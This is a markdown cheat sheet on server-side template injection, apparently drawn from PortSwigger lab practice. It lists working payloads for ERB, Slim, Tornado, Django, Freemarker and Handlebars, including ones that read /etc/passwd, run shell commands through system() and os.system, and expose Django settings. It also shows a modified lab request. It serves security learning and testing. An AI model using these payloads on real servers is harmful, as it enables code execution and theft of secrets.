 # Server Side Template Injection (SSTI)

> Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

## Summary
- [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
  - [Summary](#summary)
  - [Exploits](#exploits)
    - [identify the template engine](#identify-the-template-engine)
    - [Ruby](#ruby)
      - [Basic injections](#basic-injections)
        - [ERB Template: <%= someExpression %>](#erb-template--someexpression)
          - [Retrieve /etc/passwd](#retrieve-etcpasswd)
          - [List files and directories in file system](#list-files-and-directories-in-file-system)
          - [Print the current directory](#print-the-current-directory)
          - [List the files and folders in the current directory](#list-the-files-and-folders-in-the-current-directory)
        - [Slim Template: #{someExpression}](#slim-template-someexpression)
          - [Code execution](#code-execution)
    - [Python](#python)
      - [Basic injections](#basic-injections-1)
        - [Torando Template: {{someExpression}}](#torando-template-someexpression)
        - [Django framework : {{someExpression}}](#django-framework--someexpression)
    - [Java](#java)
      - [Basic injections](#basic-injections-2)
        - [Freemarker Template: ${someExpression}](#freemarker-template-someexpression)
    - [Javascript](#javascript)
      - [Basic injections](#basic-injections-3)
        - [Handlebars library : {{someExpression}}](#handlebars-library--someexpression)
  - [References](#references)

## Exploits

### identify the template engine 
>this doesn't work every time 

basic injection : 

```bash
${{<%[%'"}}%\
```
>and try to identify the template from 'error message'

 :fire: **example :**

**url:**
 
 ```bash
 https://sub.web-security-academy.net/?message=Unfortunately this product is out of stock
 ```
and there is a message in the web page "Unfortunately this product is out of stock "

 **Modify url to:**

 ```bash
 https://sub.web-security-academy.net/?message=<%= 7 * 7 %>
 ```

you may notice '49' which is the result of 7*7

 if so. This indicates that we may have a server-side template injection vulnerability.

### Ruby

#### Basic injections

##### ERB Template: <%= someExpression %>
```bash
<%= 7 * 7 %>
```

###### Retrieve /etc/passwd

```bash
<%= File.open('/etc/passwd').read %>
```
###### List files and directories in file system
```bash
<%= Dir.entries('/') %>
```
###### Print the current directory
```bash
<%= system("pwd") %>
```
###### List the files and folders in the current directory 

```bash
<%= system("ls") %>
```

##### Slim Template: #{someExpression}

```bash
#{ 7 * 7 }
```

###### Code execution

```bash
#{ %x|env| }
```

### Python 

#### Basic injections

##### Torando Template: {{someExpression}} 

```bash
{{7*7}}
```

In the Tornado documentation, identify the syntax for executing arbitrary Python:

**{% somePython %}**

:fire: **Example:**

```bash
{% import os %}
```

**Real world scenario**

**Request**
```bash
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: sub.web-security-academy.net
```
**Body Request**

```bash
blog-post-author-display=user.name&csrf=jnS1iGLL5K3EEE71olPacQJb2nYP0Fgk
```

**Modified Body Request :**

```bash
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('ls')&csrf=jnS1iGLL5K3EEE71olPacQJb2nYP0Fgk
```

##### Django framework : {{someExpression}}
>if you read Django documentation you may notice that the built-in template tag debug can be called to display debugging information. 

Basic Injection : 
```bash
 {% debug %} 
```
>Study the settings object in the Django documentation and notice that it contains a SECRET_KEY property, which has dangerous security implications if known to an attacker.

### Java 
#### Basic injections
##### Freemarker Template: ${someExpression}

simple injection
```bash
${3*3}
```
```bash
#{3*3}
```
**Exploring**

>you need to read Freemarker documentation to explore properly

```bash
${object.getClass()}
```

### Javascript
#### Basic injections

##### Handlebars library : {{someExpression}}


Basic injection : (input)

```bash
{{this}}
```
output:

```bash
[object Object]
```

## References
* [Portswigger](https://portswigger.net/web-security/server-side-template-injection/)

* [PayloadsAllTheThings - By swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

* [MahmoudSec](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
